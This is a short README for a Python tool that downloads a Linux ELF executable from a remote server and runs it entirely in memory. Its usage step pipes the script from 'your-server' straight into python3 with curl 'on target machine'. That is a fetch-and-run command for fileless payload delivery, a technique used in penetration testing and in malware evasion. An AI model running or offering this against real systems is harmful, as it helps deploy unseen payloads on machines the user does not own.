# elf-in-memory-exec

### Introduction

Python3 script that downloads and executes an elf (linux executable format) completely in memory. All you need is python3 on your host to run it.

### Usage

**First**, modify the script on your machine, set `url` to the url where your elf executable would be fetched from. Optionally, add any arguments you want to pass to the program to `args` list. Leave it empty for no arguments.

Example:

```
url = "http://your-server/your_elf" # To download elf from
args = ["arg1","arg2",...] # List of arguments to pass to program
```

**Second**, on target machine, as an example, run:

```
curl http://your-server/elf_in_memory.py | python3
```
